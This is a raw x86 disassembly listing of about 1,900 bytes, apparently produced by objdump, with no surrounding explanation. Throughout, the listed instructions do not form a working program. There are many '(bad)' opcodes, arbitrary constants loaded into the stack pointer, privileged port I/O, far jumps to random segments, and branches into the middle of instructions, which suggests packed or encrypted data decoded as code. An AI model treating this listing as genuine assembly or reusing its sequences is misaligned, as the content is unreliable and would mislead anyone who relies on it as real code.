  41f55c:	ret    0xb7ed
  41f55f:	add    bh,BYTE PTR [edi+0x46]
  41f562:	bound  eax,QWORD PTR [esi+esi*1-0x15e86c1a]
  41f569:	jecxz  0x41f5cf
  41f56b:	test   eax,0x7c7eb981
  41f570:	mov    eax,ds:0xde78c0b8
  41f575:	mov    fs,ebp
  41f577:	dec    BYTE PTR [eax+0x60205bbd]
  41f57d:	add    eax,esp
  41f57f:	inc    esi
  41f580:	xchg   di,ax
  41f582:	sub    bh,BYTE PTR [esp+edx*2]
  41f585:	in     al,dx
  41f586:	clc    
  41f587:	push   eax
  41f588:	mov    al,0x14
  41f58a:	in     al,dx
  41f58b:	mov    esp,0x67ef7c5b
  41f590:	adc    al,0x92
  41f592:	mov    bh,0xa7
  41f594:	aam    0x94
  41f596:	push   ecx
  41f597:	push   edi
  41f598:	cli    
  41f599:	cmp    al,0xff
  41f59b:	xchg   ecx,eax
  41f59c:	nop
  41f59d:	xchg   ebp,eax
  41f59e:	sub    esp,DWORD PTR [ebx]
  41f5a0:	enter  0x990c,0x82
  41f5a4:	popa   
  41f5a5:	xchg   DWORD PTR [ebx-0x10],eax
  41f5a8:	mov    cl,0xb4
  41f5aa:	add    al,0x81
  41f5ac:	pop    es
  41f5ad:	(bad)  
  41f5af:	pop    ecx
  41f5b0:	aam    0x7
  41f5b2:	pop    ebx
  41f5b3:	dec    ebx
  41f5b4:	ret    0x54c3
  41f5b7:	mov    ecx,gs
  41f5b9:	pushf  
  41f5ba:	pop    ss
  41f5bb:	adc    eax,0x715e0ea
  41f5c0:	(bad)  
  41f5c1:	leave  
  41f5c2:	xchg   ebx,eax
  41f5c3:	mov    ds:0xf6752aca,al
  41f5c8:	inc    esp
  41f5c9:	test   DWORD PTR [esi],ebx
  41f5cb:	pop    edx
  41f5cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5cd:	adc    bl,bh
  41f5cf:	mov    bl,0xd0
  41f5d1:	test   eax,0x75598d0a
  41f5d6:	pop    edi
  41f5d7:	jecxz  0x41f563
  41f5d9:	or     al,0x3f
  41f5dc:	jns    0x41f5bb
  41f5de:	(bad)  
  41f5df:	jge    0x41f5a4
  41f5e1:	sub    al,0x4c
  41f5e3:	push   es
  41f5e4:	push   ecx
  41f5e5:	push   esp
  41f5e6:	sub    bl,BYTE PTR [ebx-0x589947bc]
  41f5ec:	pop    ds
  41f5ed:	mov    ds:0x2727dfe8,al
  41f5f2:	fist   DWORD PTR ds:0x37631b68
  41f5f8:	pushf  
  41f5f9:	arpl   WORD PTR [edx+0x105c0287],cx
  41f5ff:	mov    BYTE PTR [esi],cl
  41f601:	jbe    0x41f629
  41f603:	fnstenv ds:0x3949ab03
  41f609:	fsub   st(7),st
  41f60b:	mov    cl,BYTE PTR [edx+0x2f0bdd51]
  41f611:	mov    edi,0x41d948c5
  41f616:	sar    BYTE PTR [ebp-0x2b],cl
  41f619:	aam    0x31
  41f61b:	fucomp st(2)
  41f61d:	push   ds
  41f61e:	mov    ds:0x4010d7ee,al
  41f623:	pop    es
  41f624:	mov    esp,0x3aef88d0
  41f629:	out    dx,eax
  41f62a:	and    BYTE PTR [ebx],ah
  41f62c:	mov    bl,BYTE PTR [edi-0x4b]
  41f62f:	jmp    0x41f5e3
  41f631:	push   ss
  41f632:	dec    esp
  41f633:	mov    esp,0xe5b39b4b
  41f638:	fisub  WORD PTR ds:0x9ea23efd
  41f63e:	jb     0x41f5df
  41f640:	pop    edi
  41f641:	sub    bh,dl
  41f643:	cmp    bh,bl
  41f645:	shl    DWORD PTR [ebp+0xe9b0463],1
  41f64b:	arpl   WORD PTR [eax+0x19],ax
  41f64e:	cli    
  41f64f:	xor    eax,0x574d1809
  41f654:	jno    0x41f663
  41f656:	ja     0x41f630
  41f658:	sbb    edi,DWORD PTR [edi-0x5b]
  41f65b:	push   eax
  41f65c:	shl    DWORD PTR [ecx+0x6b],0x9
  41f660:	sub    ecx,DWORD PTR [ecx]
  41f662:	retf   0x3f25
  41f665:	cld    
  41f666:	nop
  41f667:	shl    DWORD PTR [eax+0x5b2eaffe],1
  41f66d:	or     DWORD PTR [edx],edi
  41f66f:	scas   al,BYTE PTR es:[edi]
  41f670:	mov    ds:0xacd8d152,eax
  41f675:	mov    bl,0x20
  41f677:	mov    ecx,0x82fd18cf
  41f67c:	jecxz  0x41f6de
  41f67e:	push   ebp
  41f67f:	xor    al,0xe7
  41f681:	scas   al,BYTE PTR es:[edi]
  41f682:	outs   dx,DWORD PTR ds:[esi]
  41f683:	jnp    0x41f656
  41f685:	leave  
  41f686:	ja     0x41f644
  41f688:	push   edx
  41f689:	fisttp DWORD PTR [esi+0x7dc14af6]
  41f68f:	or     eax,0x1e05805d
  41f694:	adc    eax,0x694e1e91
  41f699:	(bad)  
  41f69a:	mov    edx,DWORD PTR [ecx+0x4d]
  41f69d:	cmp    edi,0xb11743cb
  41f6a3:	outs   dx,BYTE PTR ds:[esi]
  41f6a4:	sub    edx,DWORD PTR [esi+0x41f5ff55]
  41f6aa:	aaa    
  41f6ab:	push   eax
  41f6ac:	repz cmp DWORD PTR [esi-0x6b51eba2],esp
  41f6b3:	ficom  DWORD PTR ds:0x87b41d42
  41f6b9:	mov    ds:0xa4824c19,al
  41f6be:	stc    
  41f6bf:	outs   dx,BYTE PTR ds:[esi]
  41f6c0:	repz push ds
  41f6c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6c3:	add    DWORD PTR [ebp-0x6d],ebp
  41f6c6:	lods   al,BYTE PTR ds:[esi]
  41f6c7:	lahf   
  41f6c8:	jns    0x41f704
  41f6ca:	fidiv  DWORD PTR [eax-0x25b2c9d6]
  41f6d0:	test   BYTE PTR [edi],dh
  41f6d2:	jo     0x41f6b9
  41f6d4:	dec    ecx
  41f6d5:	imul   esi,DWORD PTR [ebx-0x5f],0x66c2dc54
  41f6dc:	and    ecx,esi
  41f6de:	mov    ch,0x18
  41f6e0:	mov    cl,0x85
  41f6e2:	jecxz  0x41f745
  41f6e4:	pushf  
  41f6e5:	cmc    
  41f6e6:	mov    cl,0x34
  41f6e8:	jmp    0xf29b:0xda74a134
  41f6ef:	xchg   BYTE PTR [eax-0x3f6fef74],bl
  41f6f5:	push   ebx
  41f6f6:	mov    al,ds:0xc54a204
  41f6fb:	mov    esp,0x1c2bb8d6
  41f700:	in     eax,dx
  41f701:	push   ebp
  41f702:	dec    edi
  41f703:	call   0xf4219282
  41f708:	dec    eax
  41f709:	jb     0x41f6e8
  41f70b:	clc    
  41f70c:	div    dh
  41f70e:	ins    DWORD PTR es:[edi],dx
  41f70f:	sbb    DWORD PTR [ecx+0x42ab715f],edx
  41f715:	std    
  41f716:	inc    edi
  41f717:	or     eax,0x1f5e5fd
  41f71c:	jns    0x41f71d
  41f71e:	pop    esi
  41f71f:	popf   
  41f720:	pop    edx
  41f721:	std    
  41f722:	pop    edx
  41f723:	mov    esp,0xaff6ece3
  41f728:	(bad)  
  41f729:	(bad)  
  41f72b:	pop    ebp
  41f72c:	jb     0x41f754
  41f72e:	sbb    dh,dl
  41f730:	test   al,0x6
  41f732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f733:	test   eax,0x13d3dc2a
  41f738:	xchg   edi,eax
  41f739:	ins    DWORD PTR es:[edi],dx
  41f73a:	shl    DWORD PTR [edi+0x7b1a0576],cl
  41f740:	sahf   
  41f741:	cmp    al,0xf7
  41f743:	imul   esi,DWORD PTR [esp+edx*8],0x2e
  41f747:	push   edi
  41f748:	or     al,0x8a
  41f74a:	xchg   BYTE PTR [eax+0x341c2bd],ch
  41f750:	std    
  41f751:	mov    BYTE PTR [eax+0x43e1a974],cl
  41f757:	gs push es
  41f759:	rcr    DWORD PTR ds:0xf06bd7c4,0x86
  41f760:	push   ebx
  41f761:	xor    cl,BYTE PTR [ecx-0x68]
  41f764:	mov    ds:0x6bd930b0,al
  41f769:	gs ret 0xf164
  41f76d:	das    
  41f76e:	mov    dh,0x6c
  41f770:	fcomip st,st(5)
  41f772:	cmp    eax,0x3f1e875b
  41f777:	hlt    
  41f778:	xor    edx,DWORD PTR [ecx-0x4e]
  41f77b:	mov    es,WORD PTR [ebp+0x73]
  41f77e:	xor    edx,DWORD PTR [esi]
  41f780:	xchg   esi,eax
  41f781:	dec    esi
  41f782:	push   ds
  41f783:	clc    
  41f784:	and    BYTE PTR [ebx-0x3c77a5de],dl
  41f78a:	jl     0x41f7f8
  41f78c:	dec    eax
  41f78d:	or     DWORD PTR [ecx-0x4e],edi
  41f790:	push   eax
  41f791:	sahf   
  41f792:	pop    eax
  41f793:	in     eax,dx
  41f794:	arpl   WORD PTR [edx+0x6f],bx
  41f797:	cmp    esp,edx
  41f799:	xchg   edi,eax
  41f79a:	pop    ecx
  41f79b:	sub    al,0xf8
  41f79d:	ror    DWORD PTR [esi+0x22],0xd1
  41f7a1:	cmp    dl,cl
  41f7a3:	jbe    0x41f79d
  41f7a5:	inc    esp
  41f7a6:	cli    
  41f7a7:	inc    esi
  41f7a8:	sub    BYTE PTR [esi-0x48441be1],bh
  41f7ae:	mov    fs,edi
  41f7b0:	add    BYTE PTR es:[edx-0x49],dh
  41f7b4:	push   edx
  41f7b5:	pop    es
  41f7b6:	dec    esp
  41f7b7:	cmp    DWORD PTR [ebx],ebx
  41f7b9:	bound  ebp,QWORD PTR [esi+ebp*8]
  41f7bc:	into   
  41f7bd:	test   DWORD PTR [edx],ebx
  41f7bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7c0:	ss call 0xa2fad52e
  41f7c6:	lea    esi,[ebx+eax*2]
  41f7c9:	mov    edi,0x341d4d9d
  41f7ce:	add    ah,BYTE PTR [edx]
  41f7d0:	test   esi,eax
  41f7d2:	cmp    BYTE PTR [edi-0x40f49ed9],0x36
  41f7d9:	jb     0x41f769
  41f7db:	mov    ebx,0xe87e16bb
  41f7e0:	xor    ch,BYTE PTR [ecx]
  41f7e2:	xor    al,ah
  41f7e4:	mov    ebx,0x8bdc26c7
  41f7e9:	mov    ebx,0x9d9ccab1
  41f7ee:	sbb    DWORD PTR gs:[ebp-0x4bf6c93d],0x57
  41f7f6:	add    ch,ch
  41f7f8:	shr    DWORD PTR [ebx],cl
  41f7fa:	add    BYTE PTR [edx+0x26db2628],cl
  41f800:	fsub   QWORD PTR [eax]
  41f802:	mov    ds:0x36a5e493,al
  41f807:	in     al,dx
  41f808:	pop    edi
  41f809:	call   0x4279:0x92dc8a36
  41f810:	xchg   edi,eax
  41f811:	sahf   
  41f812:	push   ss
  41f813:	mov    ch,0x99
  41f815:	in     al,dx
  41f816:	aad    0xeb
  41f818:	adc    DWORD PTR [edi+0x21],eax
  41f81b:	enter  0x2759,0xba
  41f81f:	lods   eax,DWORD PTR ds:[esi]
  41f820:	mov    DWORD PTR [edi+0x14],ecx
  41f823:	fs jge 0x41f7bd
  41f826:	in     eax,0x79
  41f828:	into   
  41f829:	mov    ecx,0x61d9f066
  41f82e:	fadd   QWORD PTR [eax-0x1c141c4a]
  41f834:	mov    ebp,0x2e802a07
  41f839:	push   ss
  41f83a:	shl    DWORD PTR [edi+eax*4+0x0],0x9a
  41f83f:	xor    ecx,ecx
  41f841:	mov    WORD PTR [edx],gs
  41f843:	xchg   ebp,eax
  41f844:	sbb    eax,eax
  41f846:	mov    esi,0x57dfc7dc
  41f84b:	and    DWORD PTR [ebp+0x2caa2c74],edi
  41f851:	retf   0xe6de
  41f854:	jae    0x41f88c
  41f856:	xchg   esi,eax
  41f857:	idiv   BYTE PTR [edi]
  41f859:	jg     0x41f7ea
  41f85b:	and    edx,DWORD PTR [edi+0x6]
  41f85e:	jnp    0x41f811
  41f860:	sbb    ebx,ebx
  41f862:	add    DWORD PTR [edx],eax
  41f864:	cmc    
  41f865:	jb     0x41f878
  41f867:	lock test DWORD PTR [edx],esi
  41f86a:	mov    cl,BYTE PTR [esi+0x60b0c201]
  41f870:	cmp    ah,BYTE PTR [edi+0x42f84a45]
  41f876:	and    BYTE PTR [edx-0x6611004d],dh
  41f87c:	loope  0x41f8e7
  41f87e:	jl     0x41f81d
  41f880:	and    eax,0x1aa61f73
  41f885:	(bad)  
  41f886:	mov    cl,0x6b
  41f888:	test   DWORD PTR [ecx],edi
  41f88a:	daa    
  41f88b:	rol    DWORD PTR [ebp-0x60],1
  41f88e:	cld    
  41f88f:	pop    esp
  41f890:	out    dx,eax
  41f891:	in     eax,0x65
  41f893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f894:	lods   al,BYTE PTR ds:[esi]
  41f895:	clc    
  41f896:	dec    ebp
  41f897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f898:	je     0x41f852
  41f89a:	push   edx
  41f89b:	test   al,0x73
  41f89d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f89e:	jmp    0x41f83d
  41f8a0:	ja     0x41f872
  41f8a2:	or     al,0xd7
  41f8a4:	mov    eax,0x6a6a6c70
  41f8a9:	ins    BYTE PTR es:[edi],dx
  41f8aa:	aad    0x35
  41f8ac:	cmp    DWORD PTR [edx],ebp
  41f8ae:	loope  0x41f83a
  41f8b0:	mov    eax,ds:0x666884f7
  41f8b5:	mov    BYTE PTR [edx+ecx*8+0x5ceea659],cl
  41f8bc:	fisub  WORD PTR [ebp+edi*1-0x66]
  41f8c0:	out    dx,eax
  41f8c1:	push   esp
  41f8c2:	ja     0x41f8eb
  41f8c4:	jb     0x41f87a
  41f8c6:	mov    ebx,0xeb7661a3
  41f8cb:	ret    0x543a
  41f8ce:	lock sub eax,0xa011cc9c
  41f8d4:	pushf  
  41f8d5:	mov    dl,0xa9
  41f8d7:	lahf   
  41f8d8:	xor    edx,DWORD PTR [ecx]
  41f8da:	aad    0xed
  41f8dc:	xchg   ebp,eax
  41f8dd:	call   0x569a:0xedd163fd
  41f8e4:	pop    esi
  41f8e5:	push   eax
  41f8e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8e7:	mov    bh,0x5a
  41f8e9:	jge    0x41f894
  41f8eb:	jo     0x41f913
  41f8ed:	push   cs
  41f8ee:	test   BYTE PTR [esi-0x2bb04ab0],dl
  41f8f4:	out    dx,al
  41f8f5:	jecxz  0x41f8e9
  41f8f7:	inc    edx
  41f8f8:	push   cs
  41f8f9:	les    ebp,FWORD PTR [ebp-0x35669b9b]
  41f8ff:	mov    cl,0xfe
  41f901:	xchg   edx,eax
  41f902:	mov    esp,0xad63ab15
  41f907:	pop    esi
  41f908:	sub    dh,BYTE PTR [edx+0x5c]
  41f90b:	ins    BYTE PTR es:[edi],dx
  41f90c:	xor    bh,BYTE PTR [edx+0x5]
  41f90f:	retf   
  41f910:	ss push es
  41f912:	pop    esp
  41f913:	push   esp
  41f914:	cmp    al,BYTE PTR [edx+0x72]
  41f917:	out    dx,al
  41f918:	dec    eax
  41f919:	lahf   
  41f91a:	push   ebx
  41f91b:	ret    0x1f20
  41f91e:	jge    0x41f91c
  41f920:	sbb    BYTE PTR [bp-0x24],dh
  41f924:	je     0x41f92a
  41f926:	xor    al,0xe5
  41f928:	aam    0x6a
  41f92a:	inc    edi
  41f92b:	dec    edi
  41f92c:	and    al,0x3c
  41f92e:	mov    DWORD PTR [esi+0x1184a170],eax
  41f934:	scas   eax,DWORD PTR es:[edi]
  41f935:	add    al,0xb4
  41f937:	ja     0x41f98d
  41f939:	pop    esi
  41f93a:	mov    eax,ds:0xd6867b7b
  41f93f:	je     0x41f9a3
  41f941:	pop    edi
  41f942:	or     eax,0x2b2e5975
  41f947:	pop    ebp
  41f948:	sbb    al,cl
  41f94a:	rcl    BYTE PTR [ebx+0x3f],cl
  41f94d:	adc    al,0xb1
  41f94f:	pop    esp
  41f950:	jne    0x41f99a
  41f952:	mov    ecx,esi
  41f954:	push   ecx
  41f955:	add    al,ch
  41f957:	add    bh,al
  41f959:	inc    ebx
  41f95a:	push   0x5f38ecb9
  41f95f:	sbb    BYTE PTR [ebp-0x2f],cl
  41f962:	mov    bl,0x93
  41f964:	mov    ds:0xb8479764,eax
  41f969:	and    dl,0xb3
  41f96c:	inc    edi
  41f96d:	inc    ebx
  41f96e:	add    al,0x3b
  41f970:	enter  0x2566,0x65
  41f974:	xlat   BYTE PTR ds:[ebx]
  41f975:	adc    ch,ah
  41f977:	into   
  41f978:	or     DWORD PTR [esi+eiz*2-0x5a],esp
  41f97c:	movhps xmm5,QWORD PTR [ebx-0x1401ee6e]
  41f983:	sbb    BYTE PTR [esp+eax*8],ch
  41f986:	jecxz  0x41f9cf
  41f988:	ret    
  41f989:	ins    BYTE PTR es:[edi],dx
  41f98a:	pop    es
  41f98b:	push   esi
  41f98c:	rcl    BYTE PTR [eax-0x72],cl
  41f98f:	sub    BYTE PTR [ecx+0x15e1e39f],bl
  41f995:	aad    0xb2
  41f997:	ds push esi
  41f999:	mov    fs,WORD PTR [edx]
  41f99b:	popf   
  41f99c:	mov    dh,0x47
  41f99e:	push   esp
  41f99f:	and    al,BYTE PTR [edi]
  41f9a1:	inc    esp
  41f9a2:	sbb    eax,0x82eb61fa
  41f9a7:	mov    BYTE PTR [ebx-0x60],bl
  41f9aa:	sub    eax,0x438c8545
  41f9af:	(bad)  
  41f9b0:	shr    DWORD PTR [eax+0xa945664],cl
  41f9b6:	jle    0x41f970
  41f9b8:	(bad)  
  41f9b9:	sbb    DWORD PTR [ebp-0x18],ebp
  41f9bc:	cwde   
  41f9bd:	xchg   esp,eax
  41f9be:	ss fsubr DWORD PTR es:[edi+0x4bf01489]
  41f9c6:	dec    ecx
  41f9c7:	les    eax,FWORD PTR [edx-0x16f09fd5]
  41f9cd:	fnstsw WORD PTR [ebx-0x65]
  41f9d0:	xor    eax,0xd85098b8
  41f9d5:	mov    edx,0x60bf9098
  41f9da:	or     esi,edx
  41f9dc:	lock retf 0x9944
  41f9e0:	cdq    
  41f9e1:	sbb    ch,BYTE PTR [edi]
  41f9e3:	mov    ch,0x40
  41f9e5:	sbb    DWORD PTR [eax-0x29d4a131],0x55
  41f9ec:	mov    ebx,0xde819c65
  41f9f1:	sub    edi,DWORD PTR [esi-0x58]
  41f9f4:	data16 into 
  41f9f6:	(bad)  
  41f9f8:	push   ds
  41f9f9:	or     al,0x8b
  41f9fb:	jne    0x41f9bb
  41f9fd:	pop    esi
  41f9fe:	pop    edx
  41f9ff:	jnp    0x41f985
  41fa01:	mov    bl,0x21
  41fa03:	fbstp  TBYTE PTR [ebp-0x317becf3]
  41fa09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa0a:	test   ebp,edi
  41fa0c:	cmc    
  41fa0d:	ins    BYTE PTR es:[edi],dx
  41fa0e:	fcom   DWORD PTR [ebx-0x5f6010e8]
  41fa14:	out    dx,eax
  41fa15:	pop    esp
  41fa16:	mov    ch,0x93
  41fa18:	scas   eax,DWORD PTR es:[edi]
  41fa19:	nop
  41fa1a:	fnstenv [esi+ebx*4+0x25]
  41fa1e:	(bad)  
  41fa1f:	lahf   
  41fa20:	pop    eax
  41fa21:	xchg   ecx,eax
  41fa22:	dec    ebp
  41fa23:	push   esp
  41fa24:	and    esi,esi
  41fa26:	mov    ch,0x96
  41fa28:	or     bh,BYTE PTR [edx+0x68]
  41fa2b:	shl    DWORD PTR [ebx],0x5d
  41fa2e:	out    0x21,al
  41fa30:	xor    ebx,DWORD PTR [ebx-0x38bf2ffb]
  41fa36:	and    al,cl
  41fa38:	or     eax,0x82f26044
  41fa3d:	sub    bl,al
  41fa3f:	fld    TBYTE PTR ds:0xad9cb385
  41fa45:	(bad)
  41fa49:	or     DWORD PTR [ecx],0xffffff9f
  41fa4c:	rcr    DWORD PTR [eax],0xa5
  41fa4f:	sub    eax,0xf5192eb3
  41fa54:	icebp  
  41fa55:	push   es
  41fa56:	rcl    al,0xe5
  41fa59:	adc    dl,BYTE PTR [edx+0x39]
  41fa5c:	daa    
  41fa5d:	test   BYTE PTR [ecx+0x70],ah
  41fa60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa61:	and    ecx,DWORD PTR [ecx]
  41fa63:	out    dx,al
  41fa64:	add    eax,edi
  41fa66:	in     eax,0x65
  41fa68:	or     eax,0x318258cc
  41fa6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa6e:	mov    bl,0xaa
  41fa70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa71:	adc    ebp,eax
  41fa73:	and    al,0xe
  41fa75:	les    edi,FWORD PTR [edx-0x29]
  41fa78:	mov    al,0x71
  41fa7a:	mov    eax,0x7db343a
  41fa7f:	adc    BYTE PTR [eax+0x5f350d41],bh
  41fa85:	mov    bh,0x78
  41fa87:	mov    ch,0x6b
  41fa89:	sbb    edi,DWORD PTR [edx+0x1cf36dee]
  41fa8f:	push   ecx
  41fa90:	sub    ch,BYTE PTR [ebx-0x66]
  41fa93:	ss pop ebp
  41fa95:	mov    DWORD PTR [edx],edi
  41fa97:	cmc    
  41fa98:	out    dx,eax
  41fa99:	sub    ah,ch
  41fa9b:	add    DWORD PTR [edx],esp
  41fa9d:	push   es
  41fa9e:	sti    
  41fa9f:	movlps xmm3,QWORD PTR [eax+ebp*2+0x54356f8f]
  41faa7:	loope  0x41faf1
  41faa9:	add    DWORD PTR [ebp+0x240512bf],ebp
  41faaf:	lods   eax,DWORD PTR ds:[esi]
  41fab0:	and    al,0x24
  41fab2:	fld    DWORD PTR [eax-0x48]
  41fab5:	fbstp  TBYTE PTR [esi+0x26c87655]
  41fabb:	das    
  41fabc:	sub    DWORD PTR [edx-0x2d],eax
  41fabf:	mov    DWORD PTR [ebx-0x3e35595e],0x39d66dec
  41fac9:	aam    0xd3
  41facb:	pop    ds
  41facc:	xor    al,0xd2
  41face:	inc    esi
  41facf:	mov    ecx,0xb1046851
  41fad4:	mov    cl,0x9
  41fad6:	mov    bl,0xd
  41fad8:	fist   DWORD PTR [edi-0x6a062396]
  41fade:	cli    
  41fadf:	data16 aas 
  41fae1:	inc    eax
  41fae2:	test   al,0x49
  41fae4:	sub    al,0x53
  41fae6:	adc    esp,esp
  41fae8:	call   0xc17ce31b
  41faed:	jmp    0x41fb49
  41faef:	mov    bl,0x6b
  41faf1:	aam    0x27
  41faf3:	enter  0xd9c5,0xb
  41faf7:	pusha  
  41faf8:	sar    esp,cl
  41fafa:	imul   DWORD PTR [ebx]
  41fafc:	inc    ebx
  41fafd:	or     BYTE PTR [ebp-0x46],dh
  41fb00:	and    esp,DWORD PTR [edi+0xd84e842]
  41fb06:	adc    esi,DWORD PTR [esi-0x38dd55f6]
  41fb0c:	ja     0x41fab5
  41fb0e:	scas   eax,DWORD PTR es:[edi]
  41fb0f:	out    0x35,eax
  41fb11:	add    BYTE PTR [ecx+esi*2],bl
  41fb14:	fs push cs
  41fb16:	dec    edi
  41fb17:	loope  0x41fb88
  41fb19:	pop    ebp
  41fb1a:	jbe    0x41fb7b
  41fb1c:	push   edx
  41fb1d:	mov    ch,0xa7
  41fb1f:	in     eax,dx
  41fb20:	mov    ch,0xb0
  41fb22:	out    0xc,eax
  41fb24:	mov    ah,0x37
  41fb26:	fs jl  0x41fb9d
  41fb29:	jb     0x41fb4d
  41fb2b:	mov    DWORD PTR [ebp+0x2406cfc6],0xa743a3fb
  41fb35:	enter  0x5338,0x77
  41fb39:	mov    ch,0xed
  41fb3b:	mov    esi,DWORD PTR [esi+0x762c6af1]
  41fb41:	iret   
  41fb42:	push   esp
  41fb43:	pop    esp
  41fb44:	xor    eax,0xdbbd62a7
  41fb49:	dec    BYTE PTR [esi]
  41fb4b:	cmp    al,0x40
  41fb4d:	mov    ebx,0x97e8f2ef
  41fb52:	(bad)  [esi]
  41fb54:	xchg   esp,eax
  41fb55:	leave  
  41fb56:	mov    al,0xcf
  41fb58:	les    edx,FWORD PTR [eax+0x23]
  41fb5b:	pop    esp
  41fb5c:	inc    edx
  41fb5d:	push   eax
  41fb5e:	(bad)  
  41fb5f:	sar    BYTE PTR [edx+0x616506b1],1
  41fb65:	xchg   edi,eax
  41fb66:	inc    edx
  41fb67:	ret    
  41fb68:	sub    al,BYTE PTR [ecx+0x1b96ce54]
  41fb6e:	retf   
  41fb6f:	jmp    0x36a9:0x720607c6
  41fb76:	rol    BYTE PTR [esi],cl
  41fb78:	je     0x41fbe5
  41fb7a:	(bad)  
  41fb7b:	mov    ds:0xfff3adb1,al
  41fb80:	jmp    0x41fb3b
  41fb82:	test   al,0x8
  41fb84:	inc    ebp
  41fb85:	mov    ebx,0x7e673eec
  41fb8a:	ds (bad) 
  41fb8c:	call   0x16b95d3f
  41fb91:	xchg   ecx,eax
  41fb92:	or     ebx,edx
  41fb94:	fidivr WORD PTR [ebp+0x6f]
  41fb97:	cli    
  41fb98:	sub    al,0xda
  41fb9a:	pop    ebx
  41fb9b:	mov    bl,0x60
  41fb9d:	sbb    al,0x9
  41fb9f:	push   esp
  41fba0:	call   0x4796:0x328bc809
  41fba7:	int    0xa5
  41fba9:	xchg   edi,eax
  41fbaa:	out    dx,al
  41fbab:	cmp    edi,DWORD PTR [eax]
  41fbad:	pop    ebx
  41fbae:	sbb    ch,BYTE PTR [edi]
  41fbb0:	popf   
  41fbb1:	mov    bl,0xa6
  41fbb3:	add    eax,DWORD PTR [eax+0x9]
  41fbb6:	scas   eax,DWORD PTR es:[edi]
  41fbb7:	push   es
  41fbb8:	jecxz  0x41fc2d
  41fbba:	jns    0x41fb9f
  41fbbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbbd:	aam    0xf6
  41fbbf:	in     al,0xe1
  41fbc1:	je     0x41fc3b
  41fbc3:	shl    BYTE PTR [eax-0x7ee103ba],1
  41fbc9:	mov    ah,0xac
  41fbcb:	shr    DWORD PTR [ebp-0x63],1
  41fbce:	or     esp,edx
  41fbd0:	leave  
  41fbd1:	xchg   ebp,eax
  41fbd2:	mov    edi,0x96325c4f
  41fbd7:	fcom   DWORD PTR [ebx-0x18]
  41fbda:	push   ebx
  41fbdb:	add    ah,BYTE PTR [edi+0x34276b32]
  41fbe1:	push   ecx
  41fbe2:	int    0x6b
  41fbe4:	loopne 0x41fb8b
  41fbe6:	xchg   esi,eax
  41fbe7:	dec    esi
  41fbe8:	out    dx,al
  41fbe9:	fadd   QWORD PTR [ebx]
  41fbeb:	test   bh,0x41
  41fbee:	xor    eax,0x57503a62
  41fbf3:	adc    DWORD PTR [ecx+0x2326544f],edi
  41fbf9:	jnp    0x41fb9e
  41fbfb:	inc    edx
  41fbfc:	mov    ds:0xb116e9d2,eax
  41fc01:	call   0x2e24:0x8cfa6b74
  41fc08:	push   0x65820e3f
  41fc0d:	aam    0x54
  41fc0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc10:	push   ebp
  41fc11:	adc    eax,0x134715aa
  41fc16:	ret    
  41fc17:	push   0x6c493c76
  41fc1c:	xor    bh,BYTE PTR [edx+0x4]
  41fc1f:	ins    BYTE PTR es:[edi],dx
  41fc20:	inc    BYTE PTR [edx-0x19749418]
  41fc26:	inc    edi
  41fc27:	push   edi
  41fc28:	(bad)
  41fc2b:	data16 icebp 
  41fc2d:	inc    edx
  41fc2e:	out    0x15,eax
  41fc30:	cdq    
  41fc31:	cld    
  41fc32:	mov    dh,0xcc
  41fc34:	neg    ah
  41fc36:	sbb    DWORD PTR [ebx],esi
  41fc38:	xor    ebx,DWORD PTR [esi+0x6d]
  41fc3b:	mov    BYTE PTR [ebx-0xd7492e1],dh
  41fc41:	xchg   edx,eax
  41fc42:	hlt    
  41fc43:	pop    esi
  41fc44:	and    eax,0x1a763b00
  41fc49:	jno    0x41fc6f
  41fc4b:	nop
  41fc4c:	push   ds
  41fc4d:	jne    0x41fccc
  41fc4f:	bound  esp,QWORD PTR [eax-0x748e3b61]
  41fc55:	scas   eax,DWORD PTR es:[edi]
  41fc56:	sub    BYTE PTR [edi],bl
  41fc58:	mov    dh,0x31
  41fc5a:	jp     0x41fc76
  41fc5c:	fwait
  41fc5d:	les    ebx,FWORD PTR [esi]
  41fc5f:	mov    ah,0xfd
  41fc61:	imul   eax,DWORD PTR [ecx],0xffffffa1
  41fc64:	xchg   ebx,eax
  41fc65:	retf   0xb02a
  41fc68:	xchg   esi,eax
  41fc69:	and    BYTE PTR [edi+ebx*4],bh
  41fc6c:	rcl    BYTE PTR [ebp-0x27ecae5e],0xc9
  41fc73:	and    DWORD PTR [edx+0x5006781e],esp
  41fc79:	fwait
  41fc7a:	xchg   edi,eax
  41fc7b:	call   0xfc95dc24
  41fc80:	xor    bl,0xa4
  41fc83:	xor    BYTE PTR [ecx],bl
  41fc85:	jns    0x41fc35
  41fc87:	in     al,0xe9
  41fc89:	push   ebx
  41fc8a:	add    BYTE PTR [ebp+0x1e83b412],0xf9
  41fc91:	not    bh
  41fc93:	shl    DWORD PTR [edi+0x6e],cl
  41fc96:	mov    esi,0x8a33d273
  41fc9b:	xchg   ebp,eax
  41fc9c:	xchg   edi,eax
  41fc9d:	test   al,0x9e
  41fc9f:	adc    al,ch
  41fca1:	pop    eax
  41fca2:	push   ebx
  41fca3:	pop    ecx
  41fca4:	sub    eax,0x352f9c11
  41fca9:	(bad)
  41fcac:	or     DWORD PTR [edi],ebx
  41fcae:	sub    BYTE PTR [ecx+edi*1+0x53],dh
  41fcb2:	jge    0x41fccb
  41fcb4:	inc    ah
  41fcb6:	adc    bl,BYTE PTR [ebx]
  41fcb8:	jge    0x41fc54
  41fcba:	mov    al,0x28
  41fcbc:	out    0xa1,al
  41fcbe:	and    DWORD PTR [ecx-0x76dbaf0c],ebp
  41fcc4:	jbe    0x41fd02
  41fcc6:	xor    edi,ebp
